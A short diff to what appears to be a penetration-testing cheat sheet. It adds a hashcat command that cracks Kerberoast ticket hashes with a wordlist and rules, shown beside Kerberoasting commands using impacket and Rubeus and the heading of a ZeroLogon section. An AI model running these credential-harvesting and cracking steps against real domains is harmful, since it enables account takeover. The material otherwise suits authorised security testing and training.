@@ -145,6 +145,10 @@ impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER -request
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
+```bash
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
 ZeroLogon (CVE-2020-1472)
 ---
 ```bash
